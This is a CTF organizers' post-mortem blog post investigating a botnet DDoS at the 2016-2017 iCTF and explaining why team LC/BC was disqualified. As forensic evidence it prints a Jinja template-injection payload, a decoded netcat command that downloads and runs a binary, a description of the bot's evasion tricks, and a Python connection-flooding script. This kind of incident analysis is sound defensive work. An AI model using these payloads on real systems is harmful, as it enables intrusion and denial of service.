# The 2016-2017 iCTF DDoS

On March 3rd, 2017, we ran the iCTF of the 2016-2017 school year. It was one of the largest online
attack/defense CTF ever run, and definitely the largest hosted one. This blog post will cover the
events that brought us here, the main issue the iCTF ran into, and the in-depth analysis that we
ran in order to understand what exactly went wrong.


- - -

# TL;DR

Several hours before completion of the game, the iCTF was brought down by <strike>an illegal
(rules-wise, not law-wise)</strike> a rule-violating Distributed Denial of Service attack launched
by the second-place team (LC/BC) against the first-place team (Bushwhackers). While the attack was
probably meant to take down Bushwhackers and ensure LC/BC's victory, it had the ironic effect of
shutting down the game at an exact point where Bushwhackers were (barely) ahead, sealing LC/BC in
second place. After much deliberation, we decided to disqualify LC/BC from the 2016-2017 iCTF for
launching this DDoS.


# How We Got Here

The iCTF is one of the longest-running Capture the Flag competitions out there.
We started in 2003, and have run every school year since. That's an important subtlety: the iCTF
has, for most of its life, been an academic CTF. This meant that, until this year, teams had to be
made of students and had to provide a professor as an academic point-of-contact. This provided a
great environment for students to learn about computer security, but also had another effect: in
the case of problems (such as, say, one team DDoSing others), we could reach out to a professor
that had a) the authority, b) the maturity, and c) the desire to preserve their reputation and
could shut the problems down quickly.

While this made the games themselves less prone to attack, it also left us less prepared for a
competition where the players had much less accountability. This year, with the iCTF opening
itself to all players, regardless of academic status, the iCTF was such a competition. We assumed
a good-faith effort on the parts of the participants not to violate the rules. We were wrong, and
that's on us. Next time, we will do better. However, just because we shouldn't have trusted
everyone to be decent players, this does not mean that players get a free pass for taking
advantage of that trust.

When the iCTF network melted down under the DDoS, and we eventually called the game over, LC/BC,
who got 2nd place by a tiny margin, cried bloody murder. There's a right way to approach the
question of "are you sure the results are legit," and there's a more aggressive way. They opted
for the latter (from <https://goo.gl/gBJ3NK>):

    :::text linenos=no
    From: Max Moroz
    To: ictf-participants@googlegroups.com

    <snip>

    Stopping the game at the random moment == select a winner.

    In case if you wanted to say that those 41 flags from the gist above do not cover the final
    delta, I should say that we have many more flags that were not submitted due to issues on your
    side. We both understand it. Once the logs be released, we can see how many of our flags your
    system didn't count.

    Summary

    The longer you do not publish the logs, the more obvious it becomes that you see some issues
    in there. For example, since your API server had been confused with multiple authorization
    sessions, it probably could count submitted flags on behalf of incorrect teams, the same way
    as it has been throwing SSH keys in random sessions. How does it sound? Do you see random
    spikes in "Last Round Points" for random teams?

    In case if you need some extra time to clean up the logs, I would not recommend to do this, as
    it would be a complete dishonor when somebody proves the modification later.

    Looking forward to releasing the data and establishing transparency.

Allegations of our impartiality aside, they wanted an in-depth analysis, and we did one. In
the rest of this document, we lay out our investigation into the DDoS that brought down the
network and show our evidence that LC/BC was, in fact, responsible for that DDoS (which,
obviously, is not an allowed move in CTF).


# Tale of a DDoS

Imagine: it's 4am in the morning, and the organizers have not slept for over 20 hours. An exciting
competition is shaping up between two teams: LC/BC and Bushwhackers. They both are within a few
points of one another and fighting for the winner-take-all prize of a DEF CON CTF 2017 entry.
Around the same time, the network performance starts degrading. The network slows down to a crawl
and becomes unusable. Every attempt by the sleep-deprived organizers to restart the routing system
is immediately foiled by a barrage of traffic from a number of teams. Ultimately, the organizers
cannot get the network back up and decide to end the competition.

What happened? Keep reading to find out.

First, let's give you some basic understanding of how the network was laid out. Here is our "war
range," a whole /17 network (because there were more than 254 teams).

<div align="center" width="100%">
    <img src="/images/ictf2016-2017/0.png" width="80%" alt="Network Layout"></img>
</div>

Each team received one VM in the /17, hosted by us. Team VMs had IPs of 172.31.129.TEAM_ID for
TEAM_IDs under 255 and 172.31.130.(TEAM_ID-254) for TEAM_IDs over 254. LC/BC, for the record, was
TEAM_ID 274, which gave them the IP 172.31.130.20. This becomes important later.

All communication was routed through our central router, which masqueraded (anonymized),
monitored, and controlled their traffic. During the competition, the router worked well until
4:30am, when it started to become overloaded. Based on the traffic logs, at 4:15 am, every team
started initiating connections to Bushwhackers on several ports -- this included teams that had
never even logged into their VMs.  In other words, someone other than the owners, had taken
enough control of the machines to initiate traffic towards Bushwhackers. This makes sense, as we
did not adopt the seccomp sandboxing that has become popular in other attack-defense CTFs.

<img src="/images/ictf2016-2017/1.png" width="100%" alt="Connections Intiated per Minute to Bushwhackers"></img>

The raw number of connections per second was tolerable. However, the average connection length
started to cause a problem.  Since the connections were never properly disconnected, the average
length of an open connection shot up from 2.3 seconds to 43.1 seconds.  This means that roughly
40,000 to 80,000 connections were held open by the router.

The end result was that Bushwhackers was dead in the water and the router was barely able to pass
through any other connections. The game was stopped.


## Traffic Logs

Looking at the graph above, the traffic suddenly jumped at around 4:15am for Bushwhackers.  The
number of Bushwhackers-bound connections rose from an average of 11.5 connections per second to 521
connections per second. The average duration of the connections increased from 2.3 seconds to 43.1
seconds. This held for nearly every team.

<img src="/images/ictf2016-2017/2.png" width="100%" alt="Connections per Second to Bushwhackers"></img>

The above graph shows three teams, chosen randomly from those still active at 4am.  The
near-simultaneous jump in traffic across all the teams seems unlikely to be caused by a normal
progression of the game. Moreover, it is unlikely that all the teams suddenly decided to collude
against Bushwhackers. Thus, this spike is likely due to an external source that caused the teams to
start initiating those connections.


## Needle in a Haystack?

We analyzed several team VMs to determine what caused the spike in connections. We started with
one of the teams whose players had never logged in (we'll call this one "Team Rndm"). We knew what
should have been on the machine, and we found some things that should not have been. Specifically,
in /tmp, we found:

<img src="/images/ictf2016-2017/3.png" width="100%" alt="Symlinks to /hui/pizda"></img>

Note the broken symlinks there to /hui/pizda. For the record, here are the translations for
[hui](https://translate.google.com/#ru/en/%D1%85%D1%83%D0%B9) and
[pizda](https://translate.google.com/#ru/en/%D0%BF%D0%B8%D0%B7%D0%B4%D0%B0) from Russian
(de-transliterated) to English. While these files were gone from Rndm's machine, by checking the
logs of the flasking_unicorns service across several teams, we did find attack traffic that would
cause this file to be created, such as:

    :::text linenos=no
    GET
    /nice_try?next=/nice_try?qwe=123%7B%7B().__class__.__base__.__subclasses__()[59]()._module.__builtins__[().__class__.__base__.__subclasses__()[59]()._module.__builtins__.keys()[109]](().__class__.__base__.__subclasses__()[59]()._module.__builtins__[().__class__.__base__.__subclasses__()[59]()._module.__builtins__.keys()[84]](28531)[2:].decode(().__class__.__base__.__subclasses__()[59]()._module.__builtins__.keys()[84])).system(().__class__.__base__.__subclasses__()[59]()._module.__builtins__[().__class__.__base__.__subclasses__()[59]()._module.__builtins__.keys()[84]](72972124064846007756595026691783025840304375086663582832834300809497899368234278311051663970255086482162180723180528984862257)[2:-1].decode(().__class__.__base__.__subclasses__()[59]()._module.__builtins__.keys()[84]))%7D%7D
    HTTP/1.1" 200 492 "-" "python-requests/2.2.1 CPython/2.7.6 Linux/3.13.0-107-generic

The large numerical value (729721240....8984862257) decodes as follows:

    :::text linenos=no
    nc 2887746068 8080 >/tmp/.1;chmod +x /tmp/.1;/tmp/.1

The 2887746068 converts to 172.31.130.20, which is LC/BC's IP address.


## LC/BC's VM

A bot like the one installed by the command above is perfectly fine, but we felt that it was worth
checking out. We grabbed an image of LC/BC's end-game VM to investigate, but found that they had
completely overwritten the whole VM disk with /dev/zero. They were the only team to have done
this. Our interest was really piqued now.

Interestingly, they hadn't cleared their disk from the first half of the competition (before all
teams were moved to a new game network). On that machine, we found a proxy on port 8080 that
proxied all traffic to 7.7.7.234, which is owned by the United States Department of Defense. The
current political situation aside, we assumed that the US DOD was not collaborating with LC/BC,
and that something else must have been happening. After some digging, a VPN configuration file was
discovered that connected their instance back to 109.233.56.76 on ports 53 and 443 (creating a
172.31.0.0/16 network). In addition, a few iptables rules were found that forwarded incoming
requests to 7.7.7.0/24.

    :::text linenos=no
    iptables -A FORWARD -s 7.7.7.0/24 -d 172.31.0.0/16 -j ACCEPT
    iptables -A FORWARD -s 172.31.0.0/16 -d 7.7.7.0/24 -j ACCEPT
    iptables -t nat -A POSTROUTING -s 7.7.7.0/24 -d 172.31.0.0/16 -j MASQUERADE

For the record, 109.233.56.76 is currently the server hosting ctf.su
(<http://www.w3ju.com/w/ctf.su>), which is the site of MSLC, the "LC" in LC/BC. This is still ok —
if they want to pretend to be the DOD, more power to them. But things were looking rather juicy
now.


## PCAPs

At this point, the investigation would have really benefitted from a tcpdump that
included port 8080. However, due to a configuration error, the iCTF router only captured traffic
for the service ports (namely, 20001-20012).

Hoping that some teams did not make the same mistake, we scraped all team VMs for all PCAPs and,
as expected, found several teams that had recorded all traffic. We'll call them team "Packrat,"
because the name fits their PCAP-saving behavior.

Packrat's PCAP contained all traffic, not just service traffic. However since the pcap files were
collected on their machine, they contained just the traffic from and to team Packrat. Packrat's
capture started at 11:05pm and stopped at 11:00am, which included the time period in question. Out
of the entire pcap collection, the only non-service port traffic found was between Packrat and
LC/BC. The ports being used were 3123, 8080, 37421, and 54981 with a total of 420,422 packets
captured.

Port 3123 contained another netcat-something-into-tmp transaction. Port 8080 contained the
netcatted binary. Port 37421 contained a bunch of obfuscated data, which we assumed was either
exfiltrated flags or some other payload for the dropped bot (stay tuned!). There were 8,865
connections on this port alone, sent repeatedly and changing every once in a while. Port 54981
just contained RST packets.

<img src="/images/ictf2016-2017/4.png" width="100%" alt="Connections from/to LC/BC to Team X"></img>


## LC/BC's Binary

We extracted the binary transferred over port 8080 to Packrats. We also
identified the same binary in pcap files sourced from other teams as well. At this point, the
reasonable assumption is that this binary might use the ports (and payloads) that we discussed
previously, so we set out to reverse engineer it, in true CTF style.

The binary is a packed and obfuscated ELF. A cursory investigation revealed that it actually was
UPX-packed, just with all the identifying information and magic numbers stripped out. Replacing
all instances of '\x00\x00\x00!' with 'UPX!' was enough to allow UPX to unpack it.

It's a pretty standard CTF persistence binary, employing some fun tricks to stay hidden
(constantly changing process IDs, replacing argv[0] with a benign name randomly selected from a
list of common linux services, making replicas of itself to prevent a single process from being
killed, deleting its own executable after making an in-memory copy, etc.) while providing a
backdoor onto the host. The program connects to LC/BC's IP (172.31.130.20) on ports 37421 and
54981, sends some identifying information, reads data, de-obfuscates it, and then executes it. The
method used to obfuscate the message was to xor each byte with 0x8e and then add 34, which is easy
to reverse.

One interesting bit of functionality is that, when the binary is running under the user "hellman,"
it prints "RUNNING UNDER hellman" and then exits, neutering its functionality. Considering that
hellman is the nickname of an LC/BC team member, and combined with the fact that this binary was
ultimately served up through a VPN operated by ctf.su, this pretty solidly confirms the binary's
origin as LC/BC.

Interestingly, googling for some of the strings in the binary netted us a [link to a malware
analysis sandbox
website](https://malwr.com/analysis/ZjU0YzMwODAyNjQ0NDJhZWJhYThhNGI0YjNiYjliZGY/), where it looks
like a very similar binary had been uploaded several months ago under the filename "lcbc." The
analysis sandbox itself is actually for windows programs, so it doesn't particularly accomplish
much on this binary, but several strings match, including the "running under hellman" string. It
looks like this isn't the first time LC/BC used this bot.


## Decoding the Payload

With a method to decode the transmissions, we were able to see the data sent from LC/BC to
Packrat. Using the method described, we decoded all of the messages sent from LC/BC to Packrat on
port 37421. Specifically, a bash script would be sent to the program running on the compromised
team's host, the program would execute the script, and it would return the results of the
execution to LC/BC. The first several payloads we decoded simply leaked flags, which is a practice
that we wholeheartedly support.

However, this is functionality that could very easily be turned to the dark side. Trying to rule
this out, we looked at payloads that were sent right around when the DDoS began, at 4:15am. We
discovered one previously-unseen payload, sent at precisely 4:15am.


## The Smoking Gun

We decoded what became our smoking gun:

    :::python linenos=no
    import time, socket
    while True:
        try:
            q = socket.create_connection(("2887745995", 20006))
            # EDITOR'S NOTE: turing_award@bushwhackers
            while True:
                res = q.recv(1)
                if not res:
                    break
            time.sleep(3)
        except:
            time.sleep(10)

This script would loop, constantly opening a connection to Bushwhackers, which is Team 203 with the
IP address of 172.31.129.203, holding the connection open. Once enough teams were opening
connections like this, the connection would fail, and the script would try again in 10 seconds. On
its own, on one team, this would have been naughty but not disastrous. However, there were over
300 teams in the game. A script containing this endless loop was sent to Packrat 417 times (in 32
different variants for ports and other tweaks). Executing over 400 instances of this script across
a large subset of teams would cause the spike in network connections that we have seen while
examining the PCAPs.

LC/BC DDoSed the 2016-2017 iCTF, causing a premature end to the competition and, ironically,
assuring Bushwhackers' victory: Karma is a bitch.


## Pre-Mortem Analysis

The analysis above is all after-the-fact. Of course, we did try to fight several different
instances of DDoS during the game. On the game's IRC channel, it was made clear that this kind of
attack was prohibited:

    :::irc linenos=no
    23:15 <@salls> DoS from large traffic or spamming is prohibited

    [...]

    23:29 <@ltfish> Some teams: Please stop DoSing immediately - you cannot even do that from teams that you have root on.
    23:29 <@ltfish> Some teams: otherwise we will take actions

    [...]

    01:29 <@oceanx_> guys do what you want but no network dos allowed

Unfortunately, we were not listened to. This was one of the few rules of the iCTF: historically,
we've allowed flag deletion, logical DoS, and even rm -rf /. The difference is that the allowed
actions educate one team, not bring down the entire competition.


# Did LC/BC Violate the iCTF Rules?

The iCTF rules clearly state that "denial-of-service attacks against the infrastructure or
other teams are not tolerated, and are ground for being thrown out of the competition." LC/BC
launched a DDoS via a botnet running on nearly all the team VMs. The binary came from the  LC/BC
IP address (172.31.130.20, proxied back to ctf.su, which is their server) and grabbed its payload
from the same IP. The binary is neutered when the user id is hellman. Until 4:15am, they used this
binary for stealing flags, which is awesome. At 4:15am, however, they went to the dark side and
broke the rules.

There is no doubt: LC/BC cheated in this iCTF. Their primary motive would have been to win the
competition, which means they intended to diminish Bushwhackers' capability to obtain and submit
flags and to pass SLA checks. The difference between the score of LC/BC and Bushwhackers was less
than 1%. If the attack had been properly scaled and not taken down the game network, it is quite
possible the attack might have gone undetected and LC/BC would have won the competition.


# Where Do We Go from Here?

We had extended team discussions about what to do about this occurrence. There were three options:

1. LC/BC's cheating didn't change the outcome of who qualified for DEF CON CTF, since Bushwhackers
   still won. We could have kept quiet, taken their criticisms silently, and moved on with our
   lives.
1. LC/BC cheated. We could have outed them in this blog post, but not messed with the
   results of the game. We definitely don't need that drama in our lives.
1. LC/BC cheated. To preserve the integrity of the iCTF, we could retroactively disqualify them
   from the 2016-2017 iCTF.

After much deliberation, we decided to disqualify LC/BC from the 2016-2017 iCTF. While this does
not matter much to, say, Bushwhackers, who are going to DEF CON regardless, it matters for the
other teams, who are playing to learn or to have fun, whose game was cut short by a rule-violating
attack. For them, we feel the obligation to preserve the integrity of the iCTF.

DDoS attacks are very easy to carry out and very lame. Being able to flood the infrastructure with
connections does not show technical superiority, just a disregard for the other players' right to
have fun and the organizers' work. We will shortly upload the scores for the 2016-2017 UCSB iCTF
to CTFtime, with LC/BC removed. <strike>Since LC/BC runs CTFtime, it'll be interesting to see what
happens. At the last event where LC/BC cheated (CODEGATE Finals 2016:
<https://CTFtime.org/event/317>), the event weight was changed to 0. This might end up as a
0-rated iCTF, but at least it will be a fair one.</strike>


# The Future of the iCTF

The 2016-2017 iCTF was the first iCTF hosted on Amazon's infrastructure, and despite the issues,
the results are encouraging. Shortly, we will be generalizing the framework to allow anyone to
host their own iCTF, encouraging cybersecurity education and making attack-defense CTFs easier
than ever to run.

For next year, we are considering whether to maintain the newly-open nature of the iCTF or to
close it again to only academic teams. We are interested in hearing opinions from the CTF
community. If we do decide to keep the iCTF open to all, we have several ideas to fight such
infrastructure-destroying attacks, both through technical and through game-design means. No matter
what, though, we are committed to running a fun and fair attack-defense CTF for the community to
enjoy!

- - -

# Updates and Responses

## Updates to the Document

After our initial publication, we have made some changes to the document. In the spirit of
absolute transparency and completeness, no text has been removed, instead it has been crossed out.
Specifically, we have updated:

1. We added a table of contents.
1. We clarified our language about the rule violations.
1. We removed the suggestion that the weight for CODEGATE 2016 was set to 0 because LC/BC cheated,
   after a clarification from kyprizel.

Any further changes to the document will be documented here.

Please follow us on Twitter, where we will announce any future updates to this post:
[@UCSBiCTF](https://twitter.com/ucsbictf).


## Responses to our Findings

Since we have published the results of our investigation, one member of LC/BC has responded. We
might comment on future responses on our findings here as well.

### 2017/04/04 - Response by kyprizel of LC/BC and CTFtime

kyprizel from LC/BC and maintainer of CTFtime posted a response to
[CTFtime.org](https://ctftime.org/ictf-wtf):

<div align="center" width="100%">
    <img src="/images/ictf2016-2017/ictf-wtf.png" width="100%" alt="Post by kyprizel"></img>
</div>

We would like to take the opportunity to clarify some of the points:

1. "illegal" was an unfortunate choice of words. As the article explicitly clarified in
   parentheses, we meant against the iCTF rules, not illegal. We have clarified the blog post to
   this effect. Obviously, no one should worry about legal issues or consequences when playing a
   CTF.
1. The reason that finalizing the scoreboard took so long (more than the normal
   catching-up-on-sleep post-CTF) was specifically because LC/BC demanded a reckoning, and did so
   very aggressively.
1. We removed the suggestion that the weight for CODEGATE 2016 Final Event was changed because
   LC/BC cheated. We are sorry that you got caught up in this: running these sorts of things is
   too often a thankless task. We look forward to the iCTF 2016-2017 being updated to a non-0
   rating.
